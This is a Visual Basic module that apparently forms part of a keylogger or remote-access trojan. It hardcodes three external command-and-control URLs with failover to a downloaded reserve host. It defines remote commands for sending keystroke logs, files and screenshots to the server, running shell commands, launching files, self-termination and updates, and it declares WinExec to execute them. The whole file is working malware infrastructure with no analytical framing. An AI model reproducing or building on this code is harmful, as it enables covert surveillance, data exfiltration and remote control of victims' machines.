Attribute VB_Name = "hostM"
Public Const Host1 As String = "http://uniqkl1.16mb.com/"
Public Const Host2 As String = "http://uniqkl2.16mb.com/"
Public Const Host3 As String = "http://loger1.6te.net/"
Public Const ValidateFile As String = "validate"

Public Const Online = 1011
Public Const ChangeMail = 1000
Public Const SendLogToHost = 1001
Public Const SendLastLogs = 1002
Public Const SendAllLogs = 1003
Public Const CMDCommand = 1004
Public Const SendFile = 1005
Public Const SendScreen = 1006
Public Const LaunchFile = 1007
Public Const ShowMSG = 1008
Public Const ChangeServer = 1009
Public Const TerminateME = 1010
Public Const UpdateCommand = 1111

Public Const LastCommand = 1011
Public Const AllCommands As String = "allcommands.kl"

Public HostName As String, PathToCommands As String, PathToLoger As String, Com As String, FullPathHost  As String, PathToScripts As String, PathToUpdate As String
Dim strValidate As String, Reserve1 As String

Public Declare Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
'WinExec "cmd /c C:\Windows\system32\calc.exe", 0

Public Function GetValidateHost() As String
Srv1:
If Validate(Host1 & ValidateFile) Then GetValidateHost = Host1 Else GoTo Srv2
Exit Function
Srv2:
If Validate(Host2 & ValidateFile) Then GetValidateHost = Host2 Else GoTo Srv3
Exit Function
Srv3:
If Validate(Host3 & ValidateFile) Then GetValidateHost = Host3 Else GoTo ResSrv1
Exit Function
ResSrv1:
If Validate(ReserveHost1 & ValidateFile) Then GetValidateHost = ReserveHost1 'Else GoTo ResSrv2
If GetValidateHost = "" Then GetValidateHost = Host1
Exit Function
End Function

Private Function ReserveHost1() As String
ReserveHost1 = ReadFile(CommandPath & "rh1")
End Function

Public Sub CheckReserveHost()
If ReserveDownload(PathToUpdate & "reserve1", Reserve1) Then
If Len(Reserve1) > 5 Then Call CreateFile(CommandPath & "rh1", Reserve1)
End If
End Sub

Public Sub SetPath()
PathToLoger = HostName & "loger/"
PathToCommands = PathToLoger & "commands/"
'FullPathHost = PathToCommands & DirOnServer(DeCrypt(frmMain.txtKey, , True)) & "/"
PathToScripts = HostName & "scripts/"
PathToUpdate = HostName & "update/"
End Sub
